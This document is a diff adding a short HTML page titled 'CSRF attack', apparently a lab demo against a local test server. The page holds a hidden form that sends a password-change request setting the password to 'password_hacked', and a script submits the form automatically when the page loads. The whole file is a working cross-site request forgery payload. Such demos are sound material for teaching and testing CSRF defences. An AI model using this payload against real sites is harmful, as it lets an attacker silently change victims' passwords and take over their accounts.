@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+    <body>
+        <h1>CSRF attack</h1>
+        <form action="http://localhost:8000/csrf/" method="POST">
+            <input type="hidden" name="new_password" value="password_hacked">
+        </form>
+
+        <script>
+            document.forms[0].submit();
+        </script>
+    </body>
+</html>
